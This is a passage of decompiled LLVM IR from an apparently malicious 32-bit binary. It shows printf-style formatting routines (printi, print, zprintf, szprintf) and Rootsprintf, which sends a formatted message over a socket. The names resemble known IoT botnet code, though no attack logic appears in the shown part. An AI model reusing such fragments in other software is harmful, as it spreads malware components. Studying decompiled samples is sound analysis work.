  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19054.36, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @print, { 1, 2, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
